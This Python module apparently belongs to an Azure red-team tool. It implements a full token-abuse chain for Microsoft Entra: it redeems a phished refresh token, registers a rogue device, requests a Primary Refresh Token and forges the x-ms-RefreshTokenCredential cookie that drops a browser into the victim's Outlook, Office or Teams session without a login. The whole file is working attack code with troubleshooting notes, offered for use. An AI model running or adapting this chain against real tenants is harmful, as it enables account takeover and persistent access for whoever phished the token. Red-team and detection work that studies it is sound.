# Author: Mr.Un1k0d3r TrueCyber Inc
# Primary Refresh Token (PRT) minting for the browser-sso "open an already
# authenticated browser" flow.
#
# This turns a plain *refresh token* (typically harvested from a device-code
# phish against the Microsoft Authentication Broker) into a signed
# `x-ms-RefreshTokenCredential` PRT cookie that, when seeded into a fresh
# browser, makes Entra's ESTS complete SSO automatically -- you land straight in
# Outlook / Office / Teams as the user, no manual login.
#
# The chain reimplements the well-known ROADtoken / roadtx / AADInternals
# protocol:
#   1. Redeem the refresh token for a device-registration (DRS) token.
#   2. Register a device (WPJ) -> device cert + transport key.
#   3. Request a PRT + session key with the refresh token, signed by the device.
#   4. Derive the PRT cookie (SP800-108 KDF -> HS256-signed JWT).
#
# All heavy crypto lives here and `cryptography` is imported lazily so the rest
# of the tool keeps working when the package is not installed.

import os
import json
import struct
import base64
import hashlib
import requests

# Microsoft Authentication Broker - a FOCI client. Device-code / FOCI refresh
# tokens can be redeemed by it for the DRS resource and for a PRT.
BROKER_CLIENT_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e"
# Device Registration Service resource + enrollment endpoint.
DRS_RESOURCE = "urn:ms-drs:enterpriseregistration.windows.net"
DRS_ENROLL_URL = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"
# SP800-108 KDF label used by Entra for the PRT session-key derivation.
KDF_LABEL = b"AzureAD-SecureConversation"
WIN_VERSION = "10.0.19041.928"


class PRTError(Exception):
    pass


def _b64(data):
    return base64.b64encode(data).decode()


def _b64url_nopad_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _bcrypt_rsa_public_blob(public_key):
    """Encode an RSA public key as a Windows BCRYPT_RSAPUBLIC_BLOB (magic 'RSA1').

    This is the format the Device Registration Service expects for the device
    TransportKey. Sending a SubjectPublicKeyInfo/DER key instead is accepted at
    registration time but later fails the PRT request with
    'AADSTS5001210: Unsupported transport key format'."""
    nums = public_key.public_numbers()
    exp = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big")
    mod = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big")
    # BCRYPT_RSAKEY_BLOB header (little-endian): Magic, BitLength, cbPublicExp,
    # cbModulus, cbPrime1, cbPrime2. Magic 0x31415352 serialises to "RSA1".
    header = struct.pack("<IIIIII", 0x31415352, public_key.key_size, len(exp), len(mod), 0, 0)
    return header + exp + mod


def _require_crypto():
    """Import the crypto stack lazily and return the handles we need, raising a
    friendly PRTError if `cryptography` / PyJWT is missing."""
    try:
        import jwt
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, hmac, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
    except ImportError as e:
        raise PRTError(
            "The auto-PRT flow needs the 'cryptography' package (and PyJWT). "
            "Install it with: pip install cryptography"
        ) from e
    return {
        "jwt": jwt, "x509": x509, "NameOID": NameOID, "hashes": hashes,
        "hmac": hmac, "serialization": serialization, "rsa": rsa, "padding": padding,
    }


class PRTManager:
    """Mint an `x-ms-RefreshTokenCredential` PRT cookie from a refresh token."""

    def __init__(self, endpoint="microsoftonline.com", user_agent=None, rt_client_id=None, broker_client_id=None, log=print):
        self.endpoint = endpoint
        self.user_agent = user_agent
        # The client the refresh token was actually issued to (e.g. Microsoft
        # Office). Redeeming the RT with its own client is what works; the DRS
        # token just needs the right audience, not a specific client.
        self.rt_client_id = rt_client_id
        # The broker mints PRTs. Used for the PRT request; also a FOCI fallback
        # for redeeming the RT if the RT's own client is unknown.
        self.broker_client_id = broker_client_id or BROKER_CLIENT_ID
        self.log = log

    def _rt_clients(self):
        """Client IDs to try when redeeming the refresh token, RT's own first."""
        seen, out = set(), []
        for cid in (self.rt_client_id, self.broker_client_id):
            if cid and cid not in seen:
                seen.add(cid)
                out.append(cid)
        return out

    # --- HTTP helpers -----------------------------------------------------

    def _headers(self, extra=None):
        h = {"User-Agent": self.user_agent} if self.user_agent else {}
        if extra:
            h.update(extra)
        return h

    def _post(self, url, data=None, json_body=None, headers=None):
        try:
            return requests.post(url, data=data, json=json_body, headers=self._headers(headers))
        except Exception as e:
            raise PRTError(f"HTTP request to {url} failed: {e}") from e

    def _get_nonce(self):
        """Fetch a fresh ESTS nonce (srv_challenge) used to bind PRT requests."""
        r = self._post(f"https://login.{self.endpoint}/common/oauth2/token",
                       data={"grant_type": "srv_challenge"})
        nonce = r.json().get("Nonce")
        if not nonce:
            raise PRTError(f"Could not obtain an ESTS nonce: {r.text}")
        return nonce

    def _refresh_to_resource(self, refresh_token, resource, tenant):
        """Redeem the refresh token for `resource`, returning (access_token,
        new_refresh_token).

        Tries the v2.0 endpoint (scope) first, then v1 (resource), for each
        candidate client. Order matters: a refresh token issued by the v2.0
        endpoint fails at v1 with AADSTS70000 ("invalid or malformed"), which is
        the exact error the old v1-only code hit. We also try the RT's own client
        before the broker, since the DRS token only needs the right audience."""
        errors = []
        for cid in self._rt_clients():
            attempts = (
                # v2.0 first (matches how modern FOCI RTs are issued).
                (f"https://login.{self.endpoint}/{tenant}/oauth2/v2.0/token",
                 {"grant_type": "refresh_token", "client_id": cid,
                  "refresh_token": refresh_token,
                  "scope": f"{resource}/.default offline_access openid"}),
                # v1 fallback (resource-style).
                (f"https://login.{self.endpoint}/{tenant}/oauth2/token",
                 {"grant_type": "refresh_token", "client_id": cid,
                  "refresh_token": refresh_token, "resource": resource}),
            )
            for url, data in attempts:
                resp = self._post(url, data=data).json()
                if "access_token" in resp:
                    # RTs rotate on redemption -> hand back the new one so the
                    # caller doesn't replay a consumed token.
                    return resp["access_token"], resp.get("refresh_token") or refresh_token
                errors.append(f"[{cid} {'v2' if 'v2.0' in url else 'v1'}] "
                              f"{resp.get('error')}: {resp.get('error_description', resp)}")
        raise PRTError(
            f"Could not redeem the refresh token for '{resource}'. "
            "It must be a FOCI/broker refresh token (e.g. from device-code "
            "phishing the Microsoft Authentication Broker). Attempts:\n  "
            + "\n  ".join(errors)
        )

    # --- Step 2: device registration -------------------------------------

    def register_device(self, drs_access_token, device_name="AzureRedOps", tenant="common", join_type=0):
        """Register a device with the DRS and return the issued cert + keys.

        join_type 0 = Azure AD Join, 4 = Azure AD Registered. Registration writes
        a device object into the tenant -- it is not silent."""
        c = _require_crypto()
        rsa, hashes, x509, NameOID, serialization = (
            c["rsa"], c["hashes"], c["x509"], c["NameOID"], c["serialization"])

        # Device authentication key + PKCS#10 CSR.
        device_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        csr = (x509.CertificateSigningRequestBuilder()
               .subject_name(x509.Name([x509.NameAttribute(
                   NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A")]))
               .sign(device_key, hashes.SHA256()))
        csr_der = csr.public_bytes(serialization.Encoding.DER)

        # Separate transport key; the PRT session key comes back wrapped to it.
        # Must be a BCRYPT_RSAPUBLIC_BLOB ('RSA1'), not SPKI/DER, or the PRT
        # request later fails with AADSTS5001210 (Unsupported transport key format).
        transport_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        transport_pub_blob = _bcrypt_rsa_public_blob(transport_key.public_key())

        body = {
            "CertificateRequest": {"Type": "pkcs10", "Data": _b64(csr_der)},
            "TransportKey": _b64(transport_pub_blob),
            "TargetDomain": tenant,
            "DeviceType": "Windows",
            "OSVersion": WIN_VERSION,
            "DeviceDisplayName": device_name,
            "JoinType": join_type,
            "attributes": {"ReuseDevice": "true", "ReturnClientSid": "true"},
        }
        r = self._post(DRS_ENROLL_URL, json_body=body,
                       headers={"Authorization": f"Bearer {drs_access_token}"})
        data = r.json()
        cert_blob = (data.get("Certificate") or {}).get("RawBody")
        if not cert_blob:
            raise PRTError(f"Device registration failed: {json.dumps(data)}")
        # DRS-issued certs sometimes carry a non-positive serial (RFC 5280
        # violation); cryptography only warns for now. Silence that warning.
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            cert = x509.load_der_x509_certificate(base64.b64decode(cert_blob))
        device_id = None
        try:
            device_id = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        except Exception:
            pass
        return {"certificate": cert, "device_key": device_key,
                "transport_key": transport_key, "device_id": device_id}

    # --- Step 3: request the PRT ------------------------------------------

    def request_prt(self, refresh_token, device):
        """Exchange the refresh token for a PRT + session key, authenticated by
        the registered device certificate.

        This uses the broker client only: the windows_api_version=2.0 PRT
        protocol is broker-specific, and the refresh token is consumed by the
        attempt, so there is no useful non-broker fallback to try."""
        resp = self._prt_request_once(refresh_token, device, self.broker_client_id)
        if "refresh_token" not in resp or "session_key_jwe" not in resp:
            raise PRTError(f"PRT request failed [{self.broker_client_id}]: "
                           f"{resp.get('error')}: {resp.get('error_description', resp)}")
        session_key = self._decrypt_session_key(resp["session_key_jwe"], device["transport_key"])
        return resp["refresh_token"], session_key

    def _prt_request_once(self, refresh_token, device, client_id):
        """Single PRT request with a given client_id; returns the parsed JSON."""
        c = _require_crypto()
        jwt, serialization = c["jwt"], c["serialization"]

        cert_der = device["certificate"].public_bytes(serialization.Encoding.DER)
        device_key_pem = device["device_key"].private_bytes(
            serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption())

        headers = {"alg": "RS256", "typ": "JWT", "x5c": [_b64(cert_der)]}
        payload = {
            "client_id": client_id,
            "request_nonce": self._get_nonce(),
            "scope": "openid aza ugs",
            "win_ver": WIN_VERSION,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
        }
        signed = jwt.encode(payload, device_key_pem, algorithm="RS256", headers=headers)

        return self._post(
            f"https://login.{self.endpoint}/common/oauth2/token",
            data={
                "windows_api_version": "2.0",
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "request": signed,
                "client_info": "1",
                "tgt": "true",
            },
        ).json()

    def _decrypt_session_key(self, jwe, transport_key):
        """RSA-OAEP-unwrap the session key from the JWE `encrypted_key` segment."""
        c = _require_crypto()
        padding, hashes = c["padding"], c["hashes"]
        encrypted_key = _b64url_nopad_decode(jwe.split(".")[1])
        return transport_key.decrypt(
            encrypted_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()),
                         algorithm=hashes.SHA1(), label=None),
        )

    # --- Step 4: derive the PRT cookie ------------------------------------

    def _sp800_108(self, session_key, context):
        """SP800-108 counter-mode KDF (HMAC-SHA256), 256-bit output."""
        c = _require_crypto()
        hmac, hashes = c["hmac"], c["hashes"]
        h = hmac.HMAC(session_key, hashes.SHA256())
        # i(4) || label || 0x00 || context || L(4)=256 bits
        h.update(b"\x00\x00\x00\x01" + KDF_LABEL + b"\x00" + context + b"\x00\x00\x01\x00")
        return h.finalize()

    def derive_cookie(self, prt, session_key, nonce=None):
        """Build the `x-ms-RefreshTokenCredential` value: an HS256 JWT signed
        with a key derived from the PRT session key.

        Uses **KDFv2** (Entra rejects KDFv1 with AADSTS5000611). The header
        carries `kdf_ver: 2` and the KDF context is
        `SHA256(random_ctx || raw payload-JSON bytes)` -- the *decoded* payload
        body only, matching roadlib's calculate_derived_key_v2. (Hashing the
        base64 signing input, or including the header, produces a wrong derived
        key that ESTS silently ignores -> AADSTS50058, no session.)"""
        c = _require_crypto()
        jwt = c["jwt"]
        if nonce is None:
            nonce = self._get_nonce()

        context = os.urandom(24)
        headers = {"ctx": _b64(context), "kdf_ver": 2}
        payload = {"refresh_token": prt, "is_primary": "true", "request_nonce": nonce}

        # Encode once (throwaway key) to get the canonical payload segment, then
        # derive the key from its RAW DECODED bytes.
        jbody = jwt.encode(payload, os.urandom(32), algorithm="HS256", headers=headers).split(".")[1]
        kdf_context = hashlib.sha256(context + _b64url_nopad_decode(jbody)).digest()
        derived_key = self._sp800_108(session_key, kdf_context)

        # Re-encode with the derived key: same header/payload, correct signature.
        return jwt.encode(payload, derived_key, algorithm="HS256", headers=headers)

    # --- Orchestrator -----------------------------------------------------

    def mint_prt(self, refresh_token, tenant="common", device_name="AzureRedOps"):
        """refresh token -> DRS token -> device -> PRT + session key.

        Stops short of deriving the cookie so the caller can derive it (with a
        fresh nonce) at the last moment, right before the browser navigates --
        the PRT cookie's `request_nonce` is short-lived, and a slow browser
        launch in between is enough to make a pre-derived cookie stale.

        Returns {prt, session_key(bytes), device_id}."""
        if not tenant:
            tenant = "common"
        self.log("Redeeming the refresh token for a device-registration (DRS) token.")
        drs_token, refresh_token = self._refresh_to_resource(refresh_token, DRS_RESOURCE, tenant)

        self.log("Registering a device with Azure AD (this writes a device object).")
        device = self.register_device(drs_token, device_name=device_name, tenant=tenant)
        if device.get("device_id"):
            self.log(f"Device registered: {device['device_id']}")

        # Use the rotated refresh token returned by the DRS redemption -- the
        # original was consumed and replaying it would fail.
        self.log("Requesting a PRT + session key with the refresh token.")
        prt, session_key = self.request_prt(refresh_token, device)
        return {"prt": prt, "session_key": session_key, "device_id": device.get("device_id")}

    def mint_prt_cookie(self, refresh_token, tenant="common", device_name="AzureRedOps"):
        """Full chain including cookie derivation. Returns
        {prt, session_key(b64), cookie, device_id}."""
        r = self.mint_prt(refresh_token, tenant, device_name)
        self.log("Deriving the x-ms-RefreshTokenCredential PRT cookie.")
        cookie = self.derive_cookie(r["prt"], r["session_key"])
        return {
            "prt": r["prt"],
            "session_key": _b64(r["session_key"]),
            "cookie": cookie,
            "device_id": r["device_id"],
        }
